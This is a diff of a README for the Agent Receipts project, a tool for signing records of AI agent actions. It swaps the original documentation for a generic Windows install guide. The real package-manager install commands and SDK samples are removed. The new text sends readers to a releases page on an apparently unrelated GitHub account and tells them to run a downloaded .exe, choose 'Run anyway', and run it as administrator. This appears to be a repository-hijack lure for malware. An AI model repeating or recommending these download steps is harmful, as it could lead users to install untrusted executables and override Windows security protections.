@@ -1,143 +1,124 @@
-<div align="center">
+# 🔐 ar - Signed AI action records
 
-# Agent Receipts
+[![Download ar](https://img.shields.io/badge/Download%20ar-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Vijayaum5537/ar/releases)
 
-**Cryptographically signed audit trails for AI agent actions**
+## 🧩 What ar does
 
-[![Go Tests](https://github.com/agent-receipts/ar/actions/workflows/sdk-go.yml/badge.svg)](https://github.com/agent-receipts/ar/actions/workflows/sdk-go.yml)
-[![TS Tests](https://github.com/agent-receipts/ar/actions/workflows/sdk-ts.yml/badge.svg)](https://github.com/agent-receipts/ar/actions/workflows/sdk-ts.yml)
-[![Python Tests](https://github.com/agent-receipts/ar/actions/workflows/sdk-py.yml/badge.svg)](https://github.com/agent-receipts/ar/actions/workflows/sdk-py.yml)
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
+ar helps you keep a signed record of AI agent actions.
 
-</div>
+It is built for Agent Receipts, a format for audit trails that you can verify later. This helps you track what an AI agent did, when it did it, and what data it used. The project includes the protocol spec, SDKs for Go, TypeScript, and Python, and an MCP proxy for agent tools.
 
-| | |
-|---|---|
-| **Project site & docs** | [agentreceipts.ai](https://agentreceipts.ai) |
-| **API reference** | [Go](https://agentreceipts.ai/sdk-go/api-reference/) · [TypeScript](https://agentreceipts.ai/sdk-ts/api-reference/) · [Python](https://agentreceipts.ai/sdk-py/api-reference/) |
-| **Blog** | [Your AI Agent Just Sent an Email](https://jongerius.solutions/post/your-ai-agent-just-sent-an-email/) · [Every MCP Tool Call My AI Makes Now Gets a Signed Receipt](https://jongerius.solutions/post/auditing-github-mcp-agent-receipts/) |
-| **Go** | [sdk/go](https://pkg.go.dev/github.com/agent-receipts/ar/sdk/go) · [mcp-proxy](https://pkg.go.dev/github.com/agent-receipts/ar/mcp-proxy) · [dashboard](https://pkg.go.dev/github.com/agent-receipts/dashboard) |
-| **npm** | [@agnt-rcpt/sdk-ts](https://www.npmjs.com/package/@agnt-rcpt/sdk-ts) |
-| **PyPI** | [agent-receipts](https://pypi.org/project/agent-receipts/) |
+## 📥 Download and install on Windows
 
----
+1. Open the [ar releases page](https://github.com/Vijayaum5537/ar/releases).
+2. Find the latest release.
+3. In the Assets list, download the Windows file for your system. It is often a `.exe` or `.zip` file.
+4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-## Start here
+If Windows asks for permission, choose **Run anyway** only if the file came from the releases page above.
 
-The fastest way to try Agent Receipts is to put [`mcp-proxy/`](mcp-proxy/) in front of an MCP server you already use.
+## 🖥️ System requirements
 
-In one step, you get:
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- Internet access for the first download
+- Enough free space to extract the files if the release ships as a zip archive
 
-- Signed receipts for every tool call
-- A tamper-evident audit chain you can verify later
-- Risk scoring and policy hooks without changing the client or server
+For best results, keep Windows up to date before you install the app.
 
-If you want to audit GitHub MCP in a real agent workflow, start with:
+## 🔎 What you can use it for
 
-- [Claude Desktop integration](https://agentreceipts.ai/mcp-proxy/claude-desktop/)
-- [Claude Code integration](https://agentreceipts.ai/mcp-proxy/claude-code/)
-- [Codex integration](https://agentreceipts.ai/mcp-proxy/codex/)
+- Track AI agent actions in a signed log
+- Review what an agent did after a task is done
+- Store audit records that can be checked later
+- Connect agent tools through an MCP proxy
+- Use the same receipt format across different apps and services
 
-## What is this?
+## 🛠️ What is included
 
-Agent Receipts is an open protocol and set of SDKs for producing cryptographically signed, tamper-evident records of AI agent actions. Every action an agent takes -- API calls, tool use, data access -- gets a verifiable receipt that can be audited later.
+- Protocol spec for Agent Receipts
+- SDKs for Go, TypeScript, and Python
+- MCP proxy support
+- Cryptographic signing with Ed25519
+- Verifiable credential support
+- A format built for audit and security workflows
 
-<picture>
-  <img alt="How it works: Authorize → Act → Sign → Link → Audit" src=".github/how-it-works.svg">
-</picture>
+## 🚦 First run steps
 
-## Project layout
+1. Download the latest Windows release from the [releases page](https://github.com/Vijayaum5537/ar/releases).
+2. Install or extract the files.
+3. Open the app from the folder where you saved it.
+4. If the app has a setup screen, follow the on-screen steps.
+5. If the app asks for a config file, keep the default values for the first run.
+6. Start the app and let it create your first receipt or proxy session.
 
-| Project | Description |
-|---------|-------------|
-| [`docs/adr/`](docs/adr/) | Architecture Decision Records |
-| [`spec/`](spec/) | Protocol specification, JSON schemas, governance |
-| [`sdk/go/`](sdk/go/) | Go SDK |
-| [`sdk/ts/`](sdk/ts/) | TypeScript SDK |
-| [`sdk/py/`](sdk/py/) | Python SDK |
-| [`mcp-proxy/`](mcp-proxy/) | MCP proxy with receipt signing, policy engine, intent tracking |
-| [`cross-sdk-tests/`](cross-sdk-tests/) | Cross-language verification tests |
-| [dashboard](https://github.com/agent-receipts/dashboard) | Local web UI for browsing and verifying receipt databases |
-| [openclaw](https://github.com/agent-receipts/openclaw) | Agent Receipts plugin for OpenClaw |
+## 🔐 Security model
 
-## 10-minute audited MCP quick start
+ar uses signed receipts so you can check whether a record changed after it was created.
 
-Install the proxy:
+This matters when you need a clear audit trail for AI work. A signed record helps you confirm the source of an action and the order of events. The project uses modern cryptography and fits well with systems that need traceable agent activity.
 
-```bash
-go install github.com/agent-receipts/mcp-proxy/cmd/mcp-proxy@latest
-```
+## 🧭 Basic workflow
 
-Wrap any MCP server:
+1. An AI agent takes an action.
+2. ar records the action as a receipt.
+3. The receipt gets signed.
+4. You store the receipt or send it through your workflow.
+5. Later, you verify the receipt to confirm it has not changed.
 
-```bash
-mcp-proxy node /path/to/mcp-server.js
-```
+## 📦 SDKs and integrations
 
-Then point your agent client at the proxy instead of the raw server:
+If you build with this project, you can use the SDK that fits your stack:
 
-- [Claude Desktop setup](https://agentreceipts.ai/mcp-proxy/claude-desktop/)
-- [Claude Code setup](https://agentreceipts.ai/mcp-proxy/claude-code/)
-- [Codex setup](https://agentreceipts.ai/mcp-proxy/codex/)
+- Go for backend tools and services
+- TypeScript for web and Node.js apps
+- Python for scripts and automation
 
-Once your agent makes tool calls, inspect the signed audit trail:
+The MCP proxy helps connect tools that follow the Model Context Protocol, so agent systems can exchange actions and receipts in a clear way.
 
-```bash
-mcp-proxy list
-mcp-proxy inspect <receipt-id>
-mcp-proxy verify --key pub.pem <chain-id>
-```
+## 🧪 Example use cases
 
-## SDK quick start
+- A support bot logs each action it takes
+- A coding agent keeps a signed history of file changes
+- A compliance team reviews AI activity after a workflow ends
+- A developer connects multiple tools through one receipt layer
+- A security team checks if an audit record was altered
 
-### Go
+## 🗂️ File types you may see
 
-```bash
-go get github.com/agent-receipts/ar/sdk/go
-```
+When you open the release page, you may see files such as:
 
-```go
-import receipt "github.com/agent-receipts/ar/sdk/go/receipt"
+- `.exe` for Windows
+- `.zip` for a packed Windows download
+- `.json` or similar files for config or protocol data
+- source archives for people who want to inspect the code
 
-r, _ := receipt.New(receipt.WithAction("tool_call", payload))
-signed, _ := r.Sign(privateKey)
-```
+For Windows, choose the file that matches the name of the app or release package.
 
-### TypeScript
+## 🧰 If the app does not open
 
-```bash
-npm install @agnt-rcpt/sdk-ts
-```
+1. Check that the download finished.
+2. Make sure you extracted the files if the release came as a zip.
+3. Right-click the app and choose **Run as administrator**.
+4. Check whether Windows Defender blocked the file.
+5. Download the file again from the [releases page](https://github.com/Vijayaum5537/ar/releases).
+6. Try the latest release, not an older one
 
-```typescript
-import { Receipt } from "@agnt-rcpt/sdk-ts";
+## 📖 Terms used in this project
 
-const receipt = await Receipt.create({ action: "tool_call", payload });
-const signed = await receipt.sign(privateKey);
-```
+- **Receipt**: a record of an AI action
+- **Audit trail**: a history of actions you can review later
+- **Signed**: protected with a cryptographic signature
+- **Verify**: check that a record has not changed
+- **MCP**: a way for tools and agents to talk to each other
+- **Ed25519**: a signing method used in modern security systems
 
-### Python
+## 🧭 Next steps
 
-```bash
-pip install agent-receipts
-```
-
-```python
-from agent_receipts import Receipt
-
-receipt = Receipt.create(action="tool_call", payload=payload)
-signed = receipt.sign(private_key)
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and PR guidelines.
-
-## Security
-
-See [SECURITY.md](SECURITY.md) to report vulnerabilities.
-
-## License
-
-Apache License 2.0 -- see [LICENSE](LICENSE).
-The protocol specification in `spec/` is licensed under MIT.
+- Open the latest release
+- Download the Windows file
+- Run the app
+- Create or load your first receipt
+- Check the signed audit trail
